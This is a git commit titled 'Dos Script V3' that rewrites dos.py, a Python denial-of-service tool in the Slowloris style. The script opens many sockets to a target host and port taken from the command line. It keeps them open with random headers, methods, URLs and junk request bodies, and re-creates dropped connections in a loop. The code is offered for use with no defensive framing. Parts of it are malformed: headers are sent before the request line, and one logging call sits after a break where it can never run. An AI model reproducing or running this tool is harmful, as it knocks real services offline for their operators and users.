60629e2fb50c622af14d88ebb8a7ba129702bf7a
learnershakil <learnershakil@gmail.com>
2023-05-20 22:19:09 +0530

    Dos Script V3

--- dos.py
+++ dos.py
@@ -1,9 +1,9 @@
-#!/usr/bin/env python
-
-import sys
+import requests
 import random
 import socket
 import time
+import logging
+import sys
 
 regular_headers = [
     "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
@@ -21,6 +21,20 @@ def init_socket(ip, port):
 
     return s
 
+def send_request(s, method="GET", url="/", headers=None, data=None):
+    # Generate random headers for each request if not provided
+    if not headers:
+        headers = random.choice(regular_headers)
+    s.send("{}\r\n".format(headers).encode('UTF-8'))
+
+    # Add random data to the request body
+    if data:
+        s.send(data.encode('UTF-8'))
+
+    # Send the request
+    request = "{} {} HTTP/1.1\r\n".format(method, url)
+    s.send(request.encode('UTF-8'))
+
 def main():
     if len(sys.argv) < 5:
         print("Usage: {} example.com 80 100 10".format(sys.argv[0]))
@@ -33,7 +47,7 @@ def main():
     timer = int(sys.argv[4])
     socket_list = []
 
-    for _ in range(int(socket_count)):
+    for _ in range(socket_count):
         try:
             s = init_socket(ip, port)
         except socket.error:
@@ -51,9 +65,32 @@ def main():
                 # Add a random delay to the next keep-alive header
                 time.sleep(random.randint(1, 10))
 
-                s.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
+                # Choose a random HTTP method
+                http_methods = ["GET", "POST", "PUT", "DELETE"]
+                method = random.choice(http_methods)
+
+                # Generate a random URL
+                urls = ["/", "/page1", "/page2", "/api/data"]
+                url = random.choice(urls)
+
+                # Generate random data for POST/PUT requests
+                data = None
+                if method in ["POST", "PUT"]:
+                    data = generate_random_data()
+
+                # Generate custom headers for the request
+                headers = generate_custom_headers()
+
+                send_request(s, method, url, headers, data)
+
+                # Process and handle the HTTP response
+                response = s.recv(1024)
+                # You can add your response processing logic here
+                # For example, logging the response status code
+                logging.info("Response status code: {}".format(response.decode('UTF-8')))
             except socket.error:
                 socket_list.remove(s)
+                logging.error("Socket error occurred.")
 
         for _ in range(socket_count - len(socket_list)):
             print("\033[1;34;40m\nRe-creating Socket...")
@@ -63,6 +100,7 @@ def main():
                     socket_list.append(s)
             except socket.error:
                 break
+                logging.error("Failed to create socket.")
 
         time.sleep(timer)
 
@@ -72,6 +110,7 @@ def main():
                 s.recv(1024)
             except socket.error:
                 socket_list.remove(s)
+                logging.error("Socket error occurred.")
 
         if len(socket_list) == 0:
             break
@@ -79,23 +118,19 @@ def main():
         # Add a random delay to the time between each keep-alive header
         time.sleep(random.randint(1, 10))
 
-        # Change the user-agent header for each request
-        user_agent = random.choice(regular_headers)
-        s.send("User-agent: {}".format(user_agent).encode('UTF-8'))
+def generate_random_data():
+    # Generate random data for the request body
+    data_size = random.randint(1, 1024)
+    return 'x' * data_size
 
-        # Add a random amount of data to the request body
-        data_size = random.randint(1, 1024)
-        s.send(b'x' * data_size)
+def generate_custom_headers():
+    # Generate custom headers for the request
+    custom_headers = [
+        "X-Request-ID: {}".format(random.randint(1, 1000)),
+        "Content-Type: application/json"
+    ]
+    return random.choice(custom_headers)
 
-        # Add a random amount of noise to the request headers
-        for header in regular_headers:
-            s.send(header + b'\n' + random.randint(1, 1024).to_bytes(4, 'big') + b'\r\n')
-
-        # Add a random amount of malformed requests
-        for _ in range(random.randint(0, 10)):
-            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('UTF-8'))
-            for header in regular_headers:
-                s.send('{}\r\n'.format(header).encode('UTF-8'))
-
-if __name__ == '__main__':
+if __name__ == "__main__":
+    logging.basicConfig(filename="log.txt", level=logging.INFO)
     main()
